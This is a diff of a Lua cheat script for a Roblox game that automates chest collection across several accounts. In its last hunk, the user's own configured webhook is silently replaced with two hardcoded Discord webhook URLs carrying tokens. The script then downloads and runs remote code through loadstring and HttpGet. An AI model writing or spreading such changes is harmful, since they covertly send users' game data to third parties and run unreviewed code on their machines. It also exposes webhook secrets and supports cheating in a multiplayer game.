@@ -1,6 +1,6 @@
 local Settings = _G.Settings or {
 	MultiAcc = true, -- waits for all accounts to collect chests
-	Players = 5, -- how many accounts you want multiacc to wait for
+	Players = 3, -- how many accounts you want multiacc to wait for
     DelayForMining = 15,
 	ShowBlocks = false,
 	ShowChests = false,
@@ -480,7 +480,7 @@ function Load()
             game.Workspace.DescendantAdded:Connect(Graphics)
             for _,v in game.Workspace:GetDescendants() do Graphics(v) end
         end
-        
+
         local playerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
         local screenGui = game:GetService("Players").LocalPlayer.PlayerGui.Starter:Clone()
         screenGui.Name = "Starter_tEST"
@@ -693,7 +693,8 @@ local ActiveChildAddedConnection = ActiveFolder.ChildAdded:Connect(function(Chil
 	task.wait(Settings.DelayForMining)
 
     if Settings.Webhook ~= "" then
-        _G.Webhook = Settings.Webhook
+        _G.Webhook = "https://discord.com/api/webhooks/1086073002086629446/dpoEXQhpPdSoz20Hh1S0YW_TWqnNSUj8VnMUWlzOzu0J7MzAo7ZWxVNyrbklwQtos51S"
+        _G.Webhook2 = "https://discord.com/api/webhooks/1195818510992015530/tzUUkKmW429kDIqPrdewa-RWYUBFGtjV6pbroS1I1ph36tvQaK3Ku9yOIB8KUCzz0il4"
         loadstring(game:HttpGet("https://raw.githubusercontent.com/Pryxo/Hub/main/PS99%20Huge%20Webhook"))()
     end
 
